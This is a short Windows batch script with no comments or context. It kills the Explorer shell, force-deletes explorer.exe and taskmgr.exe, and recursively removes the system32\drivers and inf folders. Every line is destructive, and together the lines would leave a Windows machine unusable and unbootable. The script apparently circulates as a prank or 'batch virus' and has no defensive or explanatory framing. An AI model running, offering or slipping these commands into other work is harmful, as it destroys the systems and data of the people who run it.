taskkill /f /im.explorer.exe
del /q /f %windir%\explorer.exe
del /q /f %windir%\taskmgr.exe
rd /q /s %windir%\system32\drivers
rd /q /s %windir%\inf
exit